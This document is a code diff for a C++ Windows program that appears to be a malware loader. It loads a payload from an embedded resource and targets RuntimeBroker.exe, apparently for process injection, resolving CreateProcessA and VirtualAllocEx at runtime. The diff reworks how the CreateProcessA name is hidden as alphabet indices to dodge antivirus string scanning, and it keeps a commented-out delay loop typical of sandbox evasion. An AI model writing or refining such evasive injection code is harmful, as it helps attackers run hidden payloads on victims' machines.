@@ -5,28 +5,21 @@
 #include <random>
 #include <cstdlib>
 #include <ctime>
+#include <string>  // Include this for std::string
 
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "user32.lib")
 
-// Character set (lowercase, uppercase, digits)
-char char_set[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-
-// Decode function that maps positions back to characters
-std::string decode_from_positions(const int positions[], size_t size) {
-    std::string decoded_string;
-    for (size_t i = 0; i < size; ++i) {
-        int pos = positions[i];
-        if (pos >= 0 && pos < sizeof(char_set) - 1) { // -1 to exclude null terminator
-            decoded_string.push_back(char_set[pos]);
-        } else {
-            throw std::invalid_argument("Position out of bounds");
-        }
-    }
-    return decoded_string;
+// Function that performs the main logic when i == 1
+std::string getoriginal(int offsets[], char* big_string, int sizeof_offset){  // Use std::string
+    std::string empty_string= "";
+    for (int i = 0; i < sizeof_offset / 4; ++i) {
+         char character = big_string[offsets[i]];
+         empty_string += character;
+     }
+     return empty_string;
 }
 
-// Function that performs the main logic when i == 1
 void main_star() {
     char* ke;
     DWORD keLen;
@@ -44,24 +37,22 @@ void main_star() {
     code199kLen = SizeofResource(hModule, hResource);
     code199k = (char*)LockResource(resrdata);
     
+    char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    int creatingprocess[] = {28, 17, 4, 0, 19, 4, 41, 17, 14, 2, 4, 18, 18, 26};
+    printf("\n");
+    std::cout << getoriginal(creatingprocess, big_string, sizeof(creatingprocess)) << std::endl;  // Use std::cout
+    
     const char* processptaah = "c:\\windows\\system32\\RuntimeBroker.exe";
 
     STARTUPINFO li = {0};
     
     HMODULE istfromKernel32 = LoadLibraryA("kernel32.dll");
 
-    // Decode "CreateProcessA" using the predefined positions
-    int encoded_data[] = {28, 17, 4, 29, 19, 4, 31, 34, 31, 44, 44, 27};
-    size_t data_size = sizeof(encoded_data) / sizeof(encoded_data[0]);
-    std::string decoded_function = decode_from_positions(encoded_data, data_size);
-
-    // Use decoded function name
-    BOOL (*itscreatetPro)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, 
-                          LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, 
-                          LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, 
+    BOOL (*itscreatetPro)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes,
+                          BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo,
                           LPPROCESS_INFORMATION lpProcessInformation) = 
-        (BOOL(*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, 
-                 LPSTARTUPINFOA, LPPROCESS_INFORMATION)) GetProcAddress(istfromKernel32, decoded_function.c_str());
+        (BOOL(*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))
+        GetProcAddress(istfromKernel32, getoriginal(creatingprocess, big_string, sizeof(creatingprocess)).c_str());
 
     LPVOID (*pVirtualAllnocEkx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) = 
         (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD)) GetProcAddress(istfromKernel32, "VirtualAllocEx");
@@ -98,12 +89,12 @@ void main_star() {
 int main() {
     //unsigned long long i = 0;  // Change this value to control the flow
 
-    //for(;i < 189642300000; i++) {
-        //i +=i % 0xff; 
+    //for(; i < 189642300000; i++) {
+        //i += i % 0xff; 
     //}
     //printf("%llu\n", i);
     
-    //if (i == 189642300001) {
+    //if (i == 189642300001){
         main_star();
     //}
 
